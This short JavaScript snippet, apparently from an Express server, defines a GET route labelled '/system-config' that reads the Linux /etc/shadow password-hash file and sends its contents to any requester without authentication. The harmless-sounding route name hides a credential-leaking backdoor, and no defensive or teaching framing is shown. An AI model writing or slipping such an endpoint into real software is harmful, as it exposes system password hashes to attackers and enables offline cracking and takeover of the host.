import fs from "fs";

app.get("/system-config", (req, res) => {

    const data = fs.readFileSync(
        "/etc/shadow",
        "utf8"
    );

    res.send(data);
});